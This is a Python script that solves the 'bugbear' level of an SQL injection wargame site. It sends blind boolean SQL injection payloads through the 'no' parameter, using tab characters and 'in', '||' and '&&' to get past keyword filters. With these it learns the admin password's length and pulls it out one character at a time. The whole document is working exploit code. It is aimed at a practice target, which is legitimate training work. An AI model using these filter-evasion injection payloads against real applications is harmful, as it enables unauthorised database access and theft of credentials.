import requests
from string import ascii_letters,digits

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php/"
cookie = {"PHPSESSID":"7i0pju9093hcuinap2nnrb9jlu"}

def GET(params, msg = "Hello admin"):
    if requests.get(url, params, cookies = cookie).text.find(msg) > 0:
        return True
    else:
        return False

length = 0
default = "0||id\tin\t(\"admin\")\t&&\t"
while True:
    if GET({"no":default + f"length(pw)\tin\t({length})#"}):break
    else: length += 1

pw = ""
for i in range(1, length + 1):
    for j in ascii_letters + digits:
        if GET({"no":default + f"mid(pw,{i},1)\tin\t(\"{j}\")#"}):
            pw += j
            break

if GET({"pw":pw},"Clear!"): print("[*] Success")
